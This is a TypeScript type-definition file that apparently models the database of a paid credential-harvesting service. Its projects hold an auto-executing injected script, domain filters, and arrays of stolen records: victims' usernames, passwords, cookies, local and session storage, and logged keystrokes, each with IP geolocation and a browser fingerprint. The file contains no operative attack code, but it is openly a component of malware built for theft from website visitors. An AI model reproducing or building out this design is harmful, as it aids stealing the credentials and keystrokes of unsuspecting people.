import { GitHub } from "./github";

export namespace Database {
  export class user {
    _id: string
    username: string
    id: number
    payment: {
      account_type: 'free' | 'pro' | 'elite'
      method: string
    }
    github: GitHub.authUser
    logins: object
  }

  export class project {
    _id: string
    name: string
    permissions: {
      owners: Array<number>
      admins: Array<number>
      readonly: Array<number>
    }
    config: {
      filter: {
        type: 'whitelist' | 'blacklist'
        domains: Array<object>
      }
      created_at: string
    }
    inject: {
      autoexecute: string
    }
    passwords: Array<Passwords>
    keylogger: Array<Keylogger>
  }

  interface Record {
    timestamp: string
    url: {
        title: string
        href: string
    }
    ip: {
      as: string
      city: string
      country: string
      countryCode: string
      isp: string
      lat: number
      lon: number
      org: string
      query: string
      region: string
      regionName: string
      status: string
      timezone: string
      zip: string
    }
    browser: {
        width: number
        height: number
        usergent: {
            browser: {
                name: string
                version: string
                major: string
            }
            engine: {
                name: string
                version: string
            }
            os: {
                name: string
                version: string
            }
            device: {
                model: string
                vendor: string
                type: string
            }
            cpu: {
                architecture: string
            }
        }
        headers: any
    }
  }
  
  export interface Passwords extends Record, Array<Passwords> {
    username: string
    password: string
    storage: {
      local: any
      session: any
      cookies: any
    }
  }

  export interface Keylogger extends Record, Array<Keylogger> {
    keys: string[]
  }
}